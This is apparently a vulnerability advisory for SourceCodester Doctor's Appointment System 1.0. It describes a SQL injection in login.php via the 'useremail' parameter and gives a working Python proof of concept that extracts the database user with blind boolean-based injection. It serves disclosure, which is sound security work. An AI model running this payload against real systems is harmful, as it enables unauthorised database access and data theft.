# SourceCodester Doctor's Appointment System 1.0 has a SQL Injection vulnerability in login.php
## Software
- Software: Doctor's Appointment System 1.0
- Software Link: https://www.sourcecodester.com/hashenudara/simple-doctors-appointment-project.html
- Vulnerability Type: SQL Injection
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description
A vulnerability has been found in SourceCodester Doctor's Appointment System 1.0 and classified as critical. SourceCodester Doctor's Appointment System 1.0 has a SQL Injection vulnerability in login.php. Affected is file `login.php`,The manipulation of the argument `useremail` leads to SQL inject. Remote attackers can leverage blind boolean-based SQL injection to extract data from the database.

## Vulnerability Code
- login.php
![](https://github.com/Yesec/-Doctor-s-Appointment-System/assets/19534204/aefd357d-3f5c-47eb-9e9b-2308a76b9a7f)



## POC
```python
import requests
import string

url = "http://localhost/login.php"
res = ""
dict = string.digits + string.ascii_letters + string.punctuation

for i in range(1,50):
    for j in dict:
        payload = "doctor@edoc.com' and substr(user(),%s,1)='%s'-- " % (i, j)
        data = {
            "useremail": payload
        }
        req = requests.post(url, data=data)
        if "We cant found any acount for this email" not in req.text:
            res += j
            print("[*] Found: ",res)
            break
    if len(res) != i:
        print("[*] Inject finished")
        break
```
![](https://github.com/Yesec/-Doctor-s-Appointment-System/assets/19534204/c92e4f80-44c6-44f7-a227-e010d0d6de21)

